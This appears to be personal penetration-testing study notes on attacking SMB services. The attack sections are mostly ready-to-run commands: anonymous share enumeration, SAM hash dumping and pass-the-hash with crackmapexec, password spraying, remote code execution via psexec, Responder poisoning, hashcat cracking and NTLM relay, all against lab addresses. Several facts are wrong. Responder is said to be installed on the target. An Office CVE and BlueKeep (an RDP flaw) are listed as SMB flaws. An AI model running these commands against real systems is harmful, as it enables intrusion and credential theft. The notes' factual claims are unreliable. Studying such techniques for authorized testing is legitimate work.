# SMB

<aside>
ðŸ’¡ 2/8 of Basic Network Services

</aside>

## 1. Information about SMB

- Normally TCP port 137,138,139 or 445(windows)
- In windows commonly MSRPC
- Typical Misconfiguration : anonymous authentication

```bash
smbclient -N -L //10.129.14.128 : anonymous
```

## 2. Interaction, Enumeration

```bash
smbmap -H 10.129.14.128 -r notes : show the folder notes
smbmap -H 10.129.14.128 --download "notes\note.txt" : download something
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt" : upload something
```

```bash
rpcclient -U'%' 10.10.110.17
```

- Enum4linux

```bash
./enum4linux-ng.py 10.10.11.45 -A -C
```

- Extracting Hashes /PtH

```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

## 3. Brute Forcing

```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' : password spraying
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users 
```

## 4. Remote Code Execution

```bash
impacket-psexec administrator:'Password123!'@10.10.110.17
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

## 5. Forced Authentication with Responder

### What is Responder?

Responder is a powerful open-source tool used for performing network analysis and attacks on Microsoft Windows-based systems.

Responder works by listening to traffic on the network and responding to various types of network traffic to capture authentication credentials.

To use Responder, you need to first download and install it on a computer that is connected to the network you wish to analyze.

### Process

used by attackers who have already gained access to a network and are attempting to move laterally to other system

1. Install Responder on target System
- The hostname file share's IP address is required
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
1. Execute Responder

```bash
sudo responder -I ens33
```

1. Crack captured Hashes

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

1. Pass the Hash or NLTM Replay

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

## 6. Common CVE

- CVE-2017-0143 (SMBv1)
- CVE-2020-0796 (SMBv3)
- CVE-2017-0144 (SMBv1)
- CVE-2018-0802 (connected with MS Word, Exel and Outlook)
- CVE-2019-0708 (BlueKeep)
- Eternal Blue (based on buffer overflow)
